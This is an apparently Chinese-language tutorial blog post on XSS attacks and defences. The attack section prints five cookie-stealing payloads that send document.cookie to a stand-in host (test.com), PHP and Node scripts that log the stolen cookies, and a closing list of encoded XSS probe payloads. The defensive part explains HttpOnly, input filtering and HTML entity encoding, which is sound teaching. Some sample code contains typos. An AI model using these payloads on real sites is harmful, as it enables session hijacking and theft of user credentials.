{"title":"web安全-浅谈xss攻防（二）","date":"2018-10-10T08:05:13.000Z","date_formatted":{"ll":"Oct 10, 2018","L":"10/10/2018","MM-DD":"10-10"},"link":"2018/10/10/xss-attack-defense02-md","tags":["web安全","xss"],"categories":["xss"],"updated":"2019-11-11T14:01:55.995Z","content":"<h1 id=\"前言\">前言<a href=\"2018/10/10/xss-attack-defense02-md#前言\"></a></h1><p>上次介绍了什么是XSS以及XSS的三种类型，作为上次小尾巴的总结来说：XSS跨站脚本是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对于用户的输入过滤不足引起的。攻击者利用网站漏洞把恶意脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，轻者能达到恶作剧的目的，重者可以对受害者采取cookie资料窃取，会话劫持，钓鱼欺骗等各种攻击；分为三种类型，服务端的存储型和反射性，客户端自身漏洞引起的DOM型。这次我简单总结一些常见的攻击对应的防御措施，方便以后学习回顾;</p>\n<a id=\"more\"></a>\n<h1 id=\"1-Cookie劫持\">1.Cookie劫持<a href=\"2018/10/10/xss-attack-defense02-md#1-Cookie劫持\"></a></h1><p>下面是几种是窃取用户Cookie信息的恶意代码，攻击者向漏洞页面写入类似的恶意代码从而达到获取客户端cookie信息的目的:</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">document</span>.location=<span class=\"string\">\"http://test.com/cookie.asp?cookie ='+document.cookie</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://test.com/cookie.asp?cookie ='+document.cookie\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\"><span class=\"keyword\">new</span> Image().src=<span class=\"string\">\"http://test.com/cookie.asp?cookie ='+document.cookie\"</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"actionscript\">img=<span class=\"keyword\">new</span> Image();img.src=<span class=\"string\">\"http://test.com/cookie.asp?cookie ='+document.cookie\"</span>;img.wdith=<span class=\"number\">0</span>;img.height=<span class=\"number\">0</span>;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"handlebars\"><span class=\"xml\">document.write('<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://test.com/cookie.asp?cookie ='+document.cookie\"</span> <span class=\"attr\">width</span>=<span class=\"string\">0</span> <span class=\"attr\">height</span>=<span class=\"string\">0</span> <span class=\"attr\">border</span>=<span class=\"string\">0</span>&gt;</span>')</span></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure>\n<p>诸如此类，一旦注入成功，这些恶意代码都会向某个特定的远程服务器提交cookie，攻击者会在远程服务器上写一个接收和记录cookie信息的文件<br>例如php版本：</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $cookie=$_GET[<span class=\"string\">'cookie'</span>];</span><br><span class=\"line\">    $log= fopen(<span class=\"string\">\"cookie.txt\"</span>,<span class=\"string\">\"a\"</span>);</span><br><span class=\"line\">    fwrite($log,$cookie .<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    fclose($log);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></div></figure>\n<p>或者node来处理:</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> http = <span class=\"built_in\">require</span>(<span class=\"string\">'http'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">'fs'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">http.createServer(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req,res</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> Cookies = &#123;&#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">    req.headers.cookie &amp;&amp; req.headers.cookie.split(<span class=\"string\">';'</span>).foEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">Cookies</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> parts = Cookie.split(<span class=\"string\">'='</span>);</span><br><span class=\"line\">        Cookies[ parts[ <span class=\"number\">0</span> ].trim() ] = ( parts[ <span class=\"number\">1</span> ] || <span class=\"string\">''</span> ).trim();</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(Cookies)</span><br><span class=\"line\"></span><br><span class=\"line\">    res.writeHeader(<span class=\"number\">200</span>,&#123;</span><br><span class=\"line\">        <span class=\"string\">'Set-Cookie'</span> : <span class=\"string\">'SSID=EqAc1D; Expires=Wed'</span>, </span><br><span class=\"line\">        <span class=\"comment\">// 注意上面我们不设置HttpOnly;Fix:&gt;&gt;&gt;'SSID=EqAc1D; Expires=Wed;HttpOnly'&lt;&lt;&lt;</span></span><br><span class=\"line\">\t\t<span class=\"string\">'Content-Type'</span> : <span class=\"string\">'text/plain'</span></span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    fs.open(<span class=\"string\">'cookie.txt'</span>,<span class=\"string\">'r+'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err,fd</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(err)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">console</span>.error(err);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        fs.writeFile(fd,Cookies,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(err)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"built_in\">console</span>.error(err);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;).listen(<span class=\"number\">8000</span>);</span><br></pre></td></tr></table></div></figure>\n<p>亦或是jsp版本、python flask等等诸如此类可以获取到从客户端发来的cookie做接收和记录操作的。</p>\n<p>获取到存储信息的cookie.txt后，攻击者就可以通过修改网站的cookie信息（f12打开开发者控制工具，application/Cookies）来登入网站，从而来进行进一步的攻击操作。</p>\n<h2 id=\"防止cookie会话劫持\">防止cookie会话劫持<a href=\"2018/10/10/xss-attack-defense02-md#防止cookie会话劫持\"></a></h2><p>根本原因是攻击者获取cookie的恶意js代码注入到站点，进一步传到攻击者的远程服务器，从而进行攻击操作；<br>对于可能的意外注入站点的获取cookie的恶意js代码，我们一般要在设置cookie时加HttpOnly，来禁止意外注入站点的恶意js代码操作Cookie造成xss攻击<br>比如node设置HttpOnly：</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'Set-Cookie'</span> : <span class=\"string\">'SSID=EqAc1D; Expires=Wed ;HttpOnly'</span></span><br></pre></td></tr></table></div></figure>\n<p>或者php设置HttpOnly：</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> ini_set(<span class=\"string\">\"session.cookie_httponly\"</span>, <span class=\"number\">1</span>); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></div></figure>\n<h1 id=\"2-提高攻击门槛\">2.提高攻击门槛<a href=\"2018/10/10/xss-attack-defense02-md#2-提高攻击门槛\"></a></h1><h2 id=\"使用XSS-Filter\">使用XSS Filter<a href=\"2018/10/10/xss-attack-defense02-md#使用XSS-Filter\"></a></h2><p>针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容，例如：<br>1.表单数据指定值的类型：年龄只能是 int 、name 只能是字母数字等<br>2.过滤或移除特殊的 html 标签：<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>等<br>3.过滤 js 事件的标签：onclick、onerror、onfocus等<br>4.对于要求用户输入的一些特殊格式的字段，用正则和字段长度进行严格限制，比如手机号，邮箱等<br>如在客户端进行验证手机号的JavaScript代码:</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;form id=<span class=\"string\">\"test\"</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">\"text\"</span> id=<span class=\"string\">\"tel\"</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">\"button\"</span> onclick=<span class=\"string\">\"checkTel()\"</span>&gt; </span><br><span class=\"line\">&lt;<span class=\"regexp\">/form&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;script&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    function()&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">        let re = /</span>^<span class=\"number\">020</span>-\\d&#123;<span class=\"number\">8</span>&#125;$/;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(re.test(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"Tel\"</span>).value))&#123;</span><br><span class=\"line\">            alert(<span class=\"string\">'电话号码格式正确'</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            alert(<span class=\"string\">'错误的电话号码'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></div></figure>\n<p>这段JavaScript验证代码要求用户输入的必须是020-开头，后跟8位数字.</p>\n<blockquote>\n<p>但是需要特别注意的是，<em>仅仅在客户端进行非法输入的验证和检测是远远不够的</em>，因为客户端组件和用户输入不在服务器的控制范围内，用户能够完全控制客户端及提交的数据，比如firebug、TemperDate之类的工具，拦截应用程序收到和发布每一个HTTP/HTTPS请求和响应，对其进行修改和检查，从而绕过客户端的检验将信息提交到服务器中。因此，确认客户端生成数据的唯一安全方法就是在服务端实施保护措施。</p>\n</blockquote>\n<h2 id=\"输出编码Xss-Escape\">输出编码Xss Escape<a href=\"2018/10/10/xss-attack-defense02-md#输出编码Xss-Escape\"></a></h2><p>有时候我们又不可避免的需要用户输入一些特殊字符，但是我们又不确定用户输入的这段含特殊字符的数据是不是恶意的含xss的字符，为了保证用户输入的完整性和正确性，就可以使用编码（HTMLEncode）进行处理。</p>\n<p>HTML编码在防止xss攻击上能起很大的作用，它主要使用对应的实体代替HTML字符，让该字符作为其HTML文档的内容而非结构加以处理。</p>\n<div class=\"article-bounded\"><div class=\"article-table\"><table>\n<thead>\n<tr>\n<th align=\"center\">显示</th>\n<th align=\"center\">实体名字</th>\n<th align=\"center\">实体编号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>&lt;</code></td>\n<td align=\"center\"><code>&amp;lt;</code></td>\n<td align=\"center\"><code>&amp;#60;</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>&gt;</code></td>\n<td align=\"center\"><code>&amp;gt;</code></td>\n<td align=\"center\"><code>&amp;#62;</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;</code></td>\n<td align=\"center\"><code>&amp;amp;</code></td>\n<td align=\"center\"><code>&amp;#38;</code></td>\n</tr>\n<tr>\n<td align=\"center\"><code>&quot;</code></td>\n<td align=\"center\"><code>&amp;quot;</code></td>\n<td align=\"center\"><code>&amp;#34;</code></td>\n</tr>\n</tbody></table></div></div>\n<p>上面就是几个可能触发xss的敏感字符，都是一些特殊的HTML字符。都这些字符实现编码和转义后，能够有效地防范HTML注入和XSS攻击</p>\n<p>例如php的<code>htmlspecialchars()</code>库函数，就能够将用户输入的特殊字符进行实体转换：</p>\n<ul>\n<li><code>&lt;</code> 转成 <code>&amp;lt;</code></li>\n<li><code>&gt;</code> 转成 <code>&amp;gt;</code></li>\n<li><code>&amp;</code> 转成 <code>&amp;amp;</code></li>\n<li><code>&quot;</code> 转成 <code>&amp;quot;</code></li>\n<li><code>&#39;</code> 转成 <code>&amp;#39;</code></li>\n</ul>\n<p>实际情况中，我们可以结合这两种情况进行过滤<br><img src=\"/assets/images/xss-encode02.png\" alt=\"安全的过滤形式\"></p>\n<h1 id=\"3-Xss漏洞检测Poc\">3.Xss漏洞检测Poc<a href=\"2018/10/10/xss-attack-defense02-md#3-Xss漏洞检测Poc\"></a></h1><p>标准的xss漏洞检测代码</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(<span class=\"string\">'xss'</span>)&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></div></figure>\n<p>img 图片标记属性跨站攻击代码</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img <span class=\"attribute\">src</span>=<span class=\"string\">\"javascript:alert(/xss/)\"</span>&gt;&lt;/img&gt; &lt;img <span class=\"attribute\">dynsrc</span>=<span class=\"string\">\"javascript:alert('xss')\"</span>&gt;</span><br></pre></td></tr></table></div></figure>\n<p>无需 “&lt;&gt;”，利用 html 标记事件属性跨站</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img <span class=\"attribute\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attribute\">onerror</span>=alert(\"xss\")&gt;</span><br></pre></td></tr></table></div></figure>\n<p>空格与回车符转换</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img <span class=\"attribute\">src</span>=<span class=\"string\">\"Jav&amp;#x09;ascript:alert('xss')\"</span>&gt; &lt;img <span class=\"attribute\">src</span>=<span class=\"string\">\"Jav&amp;#x0A;ascript:alert('xss')\"</span>&gt; &lt;img <span class=\"attribute\">src</span>=<span class=\"string\">\"Jav&amp;#x0D;ascript:alert('xss')\"</span>&gt;</span><br></pre></td></tr></table></div></figure>\n<p>10 进制转换</p>\n<figure class=\"highlight\"><div><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img <span class=\"attribute\">src</span>=<span class=\"string\">\"&amp;#74&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41\"</span>&gt;</span><br></pre></td></tr></table></div></figure>\n<p>以上代码都可以做 Poc 使用，在有变量的位置插入，如果成功执行则代表有漏洞。<br>只要你提交的Poc，服务端原封不动的返回了，说明服务端不经过任何处理就显示了，就证明有漏洞存在。</p>\n<h1 id=\"参考资料\">参考资料<a href=\"2018/10/10/xss-attack-defense02-md#参考资料\"></a></h1><p><a href=\"https://book.douban.com/subject/25711796/\" target=\"_blank\" rel=\"noopener\">《XSS跨站脚本剖析与防御》–邱永华</a><br><a href=\"https://book.douban.com/subject/10546925/\" target=\"_blank\" rel=\"noopener\">《白帽子讲web安全》–吴翰清</a><br><a href=\"https://blog.csdn.net/gitchat/article/details/78726803\" target=\"_blank\" rel=\"noopener\">《Web 安全：前端攻击 XSS 深入解析》</a></p>\n","prev":{"title":"用AOP装饰函数-摸索篇","link":"2018/10/18/js-higherOrderFn-DecoratorPatternToAOP1"},"next":{"title":"web安全-浅谈xss攻防（一）","link":"2018/10/09/xss-attack-defense-md"},"plink":"//litten.me/2018/10/10/xss-attack-defense02-md/","toc":[{"title":"前言","id":"前言","index":"1"},{"title":"1.Cookie劫持","id":"1-Cookie劫持","index":"2","children":[{"title":"防止cookie会话劫持","id":"防止cookie会话劫持","index":"2.1"}]},{"title":"2.提高攻击门槛","id":"2-提高攻击门槛","index":"3","children":[{"title":"使用XSS Filter","id":"使用XSS-Filter","index":"3.1"},{"title":"输出编码Xss Escape","id":"输出编码Xss-Escape","index":"3.2"}]},{"title":"3.Xss漏洞检测Poc","id":"3-Xss漏洞检测Poc","index":"4"},{"title":"参考资料","id":"参考资料","index":"5"}],"copyright":{"custom":"自由转载-非商用-禁止演绎-保持署名（CC BY-NC-ND 4.0）"}}